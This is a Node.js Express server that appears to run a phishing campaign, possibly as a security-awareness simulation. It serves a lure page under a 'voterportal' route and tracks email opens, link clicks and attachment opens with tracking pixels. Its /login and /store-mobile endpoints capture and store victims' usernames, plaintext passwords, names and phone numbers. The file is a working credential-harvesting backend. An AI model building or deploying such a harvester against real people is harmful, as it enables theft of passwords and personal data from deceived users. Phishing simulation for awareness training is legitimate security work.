const connectToMongo = require('./db')
const express = require('express')
const bodyParser = require('body-parser');
// const User = require('./models/User');
const campaign2users = require('./models/campaign2');
// const sendMail = require('./utils/sendMail');
const path = require('path')
const { createUser } = require("./controllers/signnin");

connectToMongo();
const app = express()
app.use(bodyParser.json());

// handling static files 
app.use(express.static(path.join(process.cwd(), 'public')));

// handling ejs specific stuff
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'))

const port = 5000

app.get('/DynamicRoute/:userId', (req, res) => {
    const userId = req.params.userId;
    res.render("campaign2/index1.ejs", {data: userId})
})

app.post('/createuser', async (req, res) => {
    try {
        // Extract data from the request body
        const emailId = req.body.emailId;

        // Check if a user with the same emailId already exists
        const existingUser = await campaign2users.findOne({ emailId });
        if (existingUser) {
            return res.status(400).json({ message: 'User already exists with this email' });
        }

        // Create a new user object
        const newUser = new campaign2users({
            emailId,
            linkOpenCount: 0,
            emailOpenCount: 0,
            attachmentOpenCount: 0,
            submittedData: 0,
            reportedSpam: false
        });

        // Save the new user to the database
        await newUser.save();

        // Send a success response
        res.status(201).json({ message: 'User created successfully', user: newUser });
    } catch (error) {
        // If an error occurs, send an error response
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Defined API endpoint to increment linkOpenCount
app.get('/voterportal/:userId', async (req, res) => {
    try {
        // Extract userId from request parameters
        const userId = req.params.userId;
        // console.log(userId);
        // Find the user by userId
        const user = await campaign2users.findById(userId);
        // console.log(user);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Increment the linkOpenCount
        user.linkOpenCount += 1;
        user.emailOpenCount += 1;

        // Save the updated user to the database
        await user.save();

        // Send a success response
        // res.status(200).json({ message: 'linkOpenCount incremented successfully', user });
        res.render('campaign2/index1.ejs', {data: userId});
    } catch (error) {
        // If an error occurs, send an error response
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Defined API endpoint to increment attachmentOpenCount
app.get('/incrementAttachmentOpenCount/:userId', async (req, res) => {
    try {
        // Extract userId from request parameters
        const userId = req.params.userId;
        // Find the user by userId
        const user = await campaign2users.findById(userId);

        if (user) {
            user.attachmentOpenCount += 1;
            await user.save();
        }

        // Respond with a 1x1 transparent GIF image
        res.sendFile('pixel.jpg', { root: __dirname });
    } catch (error) {
        // If an error occurs, send an error response
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Defined route to handle form submission
app.post('/login', async (req, res) => {
    try {
        const { username, userId, name, phone, password, category } = req.body;

        // Update the submittedData field for the user with the provided userId
        await campaign2users.findByIdAndUpdate(userId, { $inc: { submittedData: 1 } });
        await campaign2users.findByIdAndUpdate(userId, { 
            $push: { 
                submittedContent: { 
                    username, 
                    password, 
                    category, 
                    name, 
                    phone 
                } 
            } 
        });

        // You can add additional logic here for authentication, etc.

        res.status(200).json({ message: 'Form submitted successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});


  // Route to store mobile number
app.post('/store-mobile', async (req, res) => {
    try {
      const { mobile, userId } = req.body;
    
      await campaign2users.findByIdAndUpdate(userId, { $push: { submittedContent: { mobileNo: mobile } } });
  
    //   await campaign2users.save();
      res.status(201).json({ message: 'Mobile number stored successfully' });
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: 'Internal server error' });
    }
  });
  

// // Route to handle tracking requests
app.get('/track.gif', async (req, res) => {
    try {
        const { userId } = req.query;

        // Update the user's emailOpenCount in the database
        const user = await campaign2users.findById(userId);
        if (user) {
            user.emailOpenCount += 1;
            await user.save();
        }

        // Respond with a 1x1 transparent GIF image
        res.sendFile('pixel.jpg', { root: __dirname });
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal server error');
    }
});



app.listen(port, () => {
    console.log(`Listening on port: ${port}`)
})